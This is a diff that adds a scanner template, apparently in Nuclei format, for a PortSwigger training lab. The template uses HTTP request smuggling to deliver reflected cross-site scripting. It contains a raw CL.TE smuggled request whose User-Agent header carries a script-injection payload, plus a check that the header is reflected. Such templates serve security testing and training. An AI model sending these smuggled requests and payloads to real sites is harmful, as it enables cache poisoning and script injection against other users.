@@ -1,0 +1,42 @@
+id: lab-deliver-reflected-xss
+
+info:
+  name: Exploiting HTTP request smuggling to deliver reflected XSS
+  author: pdteam
+  severity: info
+  reference: https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss
+
+http:
+  - raw:
+    - |+
+      GET /post?postId=3 HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: testXSS
+
+    matchers:
+        - type: word
+          words:
+            - "testXSS"
+          part: body
+
+  - raw:
+    - |+
+      POST / HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+      Content-Length: 150
+      Transfer-Encoding: chunked
+
+      0
+
+      GET /post?postId=3 HTTP/1.1
+      User-Agent: a"/><script>alert(1)</script>
+      Content-Type: application/x-www-form-urlencoded
+      Content-Length: 5
+
+      x=1
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==404'
